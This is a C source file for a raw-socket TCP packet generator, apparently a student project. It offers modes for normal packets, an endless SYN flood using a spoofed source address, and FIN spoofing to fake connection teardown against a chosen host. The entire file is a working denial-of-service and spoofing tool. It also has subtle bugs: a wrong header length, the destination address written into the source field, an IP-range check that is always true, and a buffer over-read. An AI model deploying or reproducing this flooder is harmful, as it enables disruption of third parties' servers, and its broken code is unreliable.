/** TCP packet injection  ( tcpinj.c) 
** Developed  by - Kruthika Manjunath & Lavanya V 

Requirements - any POSIX complaint systems with libc installed and root privileges.

COMPILATION: gcc tcpinj.c -o packgen
**/

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>                   // for string comparison functions
#include <math.h>                    //for the validation of IP address

#include<sys/types.h>                // POSIX data types here 
#include<sys/stat.h>
#include<sys/socket.h>
#include<fcntl.h>

#include<netinet/in.h>               // for header definitions
#include<netinet/ip.h>               // structure for IP Header here 
#include<netinet/tcp.h>              // structure for TCP header here

//#include"packet.c"                //header file for generating specific packets
//#include"fin.c"
#define SPORT 56321
#define DPORT 56312
#define DELIM "."           
char SRC_IP[15];
char DST_IP[15];
struct pseudo_header    //needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
     
    struct tcphdr tcp;  //From the tcp.h header
};
//This function makes sure that data sent is in right form without any errors 
unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}
// function to calculate standard CRC-16 checksum
// Credits - W.Richard Stevens
//START DEFINITION
unsigned short ComputeChecksum(unsigned char *header, int len)
{
     short sum = 0;  /* assume 32 bit long, 16 bit short */
     unsigned short *ip_header = (unsigned short *)header;

         while(len > 1)
        {
             sum+= ((*(unsigned short*) ip_header)++);
             if(sum & 0x80000000)   /* if high order bit set, fold */
               sum = (sum & 0xFFFF) + (sum >> 16);
             len -= 2;
         }

         if(len)       /* take care of leftover byte */
             sum += (unsigned short) *(unsigned char *)ip_header;
          
         while(sum>>16)
             sum = (sum & 0xFFFF) + (sum >> 16);

        return ~sum;
}
//END DEFINITION


//function to populate fields of IP header
//START DEFINITION
struct iphdr* CreateIP_header()
{
	struct iphdr *ip_header;
 	ip_header = (struct iphdr *)malloc(sizeof(struct iphdr));  //allocating memory for the IP header
 
	ip_header->version = 0x4;
	ip_header->ihl = 0x4 ;
	ip_header->tos = 0x0;
	ip_header->tot_len = sizeof(struct iphdr)+sizeof(struct tcphdr);
	ip_header->id = 0x1;
	ip_header->frag_off= 0;
	ip_header->ttl = 0xFF;
	ip_header->protocol = IPPROTO_TCP;               //setting protocol to TCP
	inet_aton(SRC_IP,(in_addr_t)ip_header->saddr );
	inet_aton(DST_IP,(in_addr_t)ip_header->saddr );
 
	ip_header->check= ComputeChecksum((unsigned char *)ip_header, ip_header->ihl*4);     //calculating the checksum
 
	return (ip_header);
 
}
//END DEFINITION


//function to populate fields of TCP header
//START DEFINITION
struct tcphdr *CreateTCP_header()
{
	struct tcphdr *tcp_header;
 	tcp_header = (struct tcphdr *)malloc(sizeof(struct tcphdr));   //allocating memory for tcp header
 	
	tcp_header->source = htons(SPORT);
	tcp_header->dest = htons(DPORT);
	tcp_header->seq = 0x00001231;
	tcp_header->ack_seq = 0x00000255;
	tcp_header->res1 = 0x0000;
	tcp_header->window= 0x0001;
	tcp_header->check = 0x0001; 
	tcp_header->urg_ptr = 0x0000;
 
	return (tcp_header);
}
//END DEFINITION


//function to generate TCP packet
//START DEFINITION
unsigned char* createPacket()
{
	  unsigned char* packet;
	  int packetlength,i;
	  struct iphdr* IP_header;
	  struct tcphdr* TCP_header;
	  char data[10]="objective";    //data

	  IP_header=CreateIP_header();
	  TCP_header=CreateTCP_header();

	  packetlength=sizeof(struct iphdr)+sizeof(struct tcphdr)+sizeof(data);//size of packet is sum of the size of ip header+tcp header+data
	  packet=(unsigned char *)malloc(packetlength); //allocating memory for packet

          //copying the headers into continious memory loactions
	  memcpy(packet,IP_header,sizeof(struct iphdr));
	  memcpy(packet+sizeof(struct iphdr),TCP_header,sizeof(struct tcphdr));
	  memcpy(packet+sizeof(struct iphdr)+sizeof(struct tcphdr),data,60);
    return packet;
}
//END DEFINITION


//function to check if a character is a valid digit
//START DEFINITION
int validdigit(char * ptr)
{
    while(*ptr)
    {   if(*ptr>='0' && *ptr <= '9')          //checking if the char is a valid decimal digit
          ++ptr;
        else
           return 0;
    }
       return 1;
}
//END DEFINITION


//funtion to validate the IP address
//START DEFINITION     
int isvalidip(char ip[])
{
   int i ,m ,n, dots;  char *ptr , *pt ;
    n = strlen(ip);
    if(n > 15 || n < 7)      //checking based on the length of IP
            return 0; 
    dots = 0;
    if(ip==NULL)   return 0;
    for(i=0;i<n;i++)
    {     if(ip[i]==ip[i+1]=='.')    //checking two consequtive '.'
            return 0;
    }

   ptr = strtok(ip , DELIM);
   if(ptr==NULL)  return 0;
   while(ptr)
   {
        
        if(!validdigit(ptr) || (strlen(ptr)>3) )
                  return 0;
         m = atoi(ptr);
         if(m >= 0 || m <= 255 )               
         {   ptr = strtok( NULL , DELIM);
             //if( == '.') return 0;
              if(ptr!=NULL)
                 ++dots;
               
          }
          else
               return 0;
    }
    if(dots!=3)
          return 0;
    else 
              return 1;
}
//END DEFINITION


//usage function to validate the command line arguments
//START DEFINITION
int usageTCP(int count,char* v1,char* v2,char* v3,char* v4, char* v5)
{
  if(count!=6)            //validation based on number of arguments
  {
    printf("Incorrect number of arguments\n FORMAT: ./packgen <protocol> <options> <src IP> <dst IP> <time interval between packets>\n The options are \n n -normal tcp packet generation\n s - SYN flood\n f - FIN spoofing");
    exit(-1);
  }
  if((strcmp(v1,"tcp")!=0)&&(strcmp(v1,"TCP")!=0))      //validation based on protocol name
  {
    printf("INVALID ARGUMENTS\n FORMAT: ./packgen <protocol> <options> <src IP> <dst IP> <time interval between packets>\n The options are \n n -normal tcp packet generation\n s - SYN flood\n f - FIN spoofing");
    exit(-1);
  }
  if(!(strcmp(v2 , "n")==0 || strcmp(v2 ,"s")==0 || strcmp(v2 , "f")==0))  // Validating the type of packets to be sent
  {
     printf("INVALID ARGUMENTS\n FORMAT: ./packgen <protocol> <options> <src IP> <dst IP> <time interval between packets>\n The options are \n n -normal tcp packet generation\n s - SYN flood\n f - FIN spoofing");
    exit(-1);
  }  
  if(isvalidip(v3)==0)                                 //validating source IP
  {
    printf("INVALID ARGUMENTS\n FORMAT: ./packgen <protocol> <options> <src IP> <dst IP> <time interval between packets>\n The options are \n n -normal tcp packet generation\n s - SYN flood\n f - FIN spoofing");
    exit(-1);
   }
  if(isvalidip(v4)==0)                                //validating destination IP
  {
    printf("INVALID ARGUMENTS\n FORMAT: ./packgen <protocol> <options> <src IP> <dst IP> <time interval between packets>\n The options are \n n -normal tcp packet generation\n s - SYN flood\n f - FIN spoofing");
    exit(-1);
   }
   if((validdigit(v5)==0) || (isdigit(atoi(v5))!=0) || atoi(v5)>5)                          //validating time interval
   {
     printf("INVALID ARGUMENTS\n FORMAT: ./packgen <protocol> <options> <src IP> <dst IP> <time interval between packets>\n The options are \n n -normal tcp packet generation\n s - SYN flood\n f - FIN spoofing");
    exit(-1);
   }
   return 1;
}
//END DEFINITION
 

/*This function creates a single packet based on parameter
 1->SYN packet to flood 2->FIN packet to spoof termination and results in unnecessary use of bandwidth , the other parameters include the source ip and destination ip */
int Createsinglepacket(int j , char src[] , char dst[] )
{
    //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_RAW);
    //buffer to represent the packet
    char buffer[4096] , source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *) buffer;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (buffer + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
     
    strcpy(source_ip , src);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr (dst);
     
    memset (buffer, 0, 4096); /* zero out the buffer */
     
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;  //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );//Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
     
    iph->check = csum ((unsigned short *) buffer, iph->tot_len >> 1);
     
    //TCP Header whose flag values depends on parameter j
    
    tcph->source = htons (1234);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* first and only tcp segment */
    if(j==2)tcph->fin=1;
    else  tcph->fin=0; 
    if(j==1) tcph->syn=1;
    else tcph->syn=0;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
                should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    //Now the IP checksum
     
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
     
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
     
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    int i=10;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Error setting IP_HDRINCL.");
        exit(0);
    }

        //Send the packet with parameters socket , the buffer containing headers and data , total length of our buffer ,routing flags, normally always 0 , socket addr, just like in a normal send() */
        if (sendto (s,buffer,iph->tot_len,0,(struct sockaddr *) &sin, sizeof (sin)) < 0)      
        {
            printf ("error\n");
        }
        //Data send successfully
        else
        {
            printf ("Packet Sent \n");
        }
     
    return 1;
}

//MAIN FUNCTION
//START DEFINITION 
int main(int argc,char* argv[])
{
	int create_sock,cont,check ,i;
	int bufsize=1024;
        const int on = 1;
        
	struct sockaddr_in address;
	
        strcpy(SRC_IP,argv[3]);
        strcpy(DST_IP,argv[4]);
        check=usageTCP(argc,argv[1],argv[2],argv[3],argv[4], argv[5]);
         //for SYN flooding
         if((strcmp(argv[2] , "s")==0) && check==1)
         {
            printf("SYN floods is generated. Enter Ctrl + C to terminate \n");
            for(;;){Createsinglepacket(1,SRC_IP,DST_IP);sleep(1);}
             exit(0);
         }
         
        if(check==1)
        {
              
		if((create_sock=socket(AF_INET,SOCK_STREAM,0))>0)    //opening socket
			printf("socket was created\n");
		address.sin_family=AF_INET;
		address.sin_port=htons(15000);
		inet_pton(AF_INET,DST_IP,&address.sin_addr);
		if(connect(create_sock,(struct sockaddr*)&address,sizeof(address))==0)   //establishing connection with server
                {
			printf("the connection was accepted with the server %s\n",DST_IP);
                        printf("request accepted .... sending packets... \n");
	        }
                else
                {
                  printf("Server unreachable\n");
                  exit(0);
                }	
		
		i=0;
                if(strcmp(argv[2] , "f")==0)
                {   printf("Fin spoof packet after 5 data packets \n");
                }
                printf("Press Ctrl+C to stop packet generation\n");
		while(1)
		{       unsigned char *buffer=malloc(bufsize);
			buffer=createPacket();                    //generating packet
                        
			sendto(create_sock, buffer,60, 0, (struct sockaddr *)&address, sizeof(struct sockaddr));     //sending the packet
                        if(i>5)
                        {
                         if(strcmp(argv[2] , "f")==0)
                         {
                 
                            Createsinglepacket(2 ,SRC_IP , DST_IP);  // Creation of FIN packet for fin spoofing 
	      	
      	                 }  
                        }
			printf("packet on wire\n");
			i++;
			sleep(atoi(argv[5]));    //delay based on the interval

	      	}
	       
         	 printf("request completed\n");
	       return close(create_sock);              //closing socket connection
        }
     //else
	exit(0);
}
//END DEFINITION





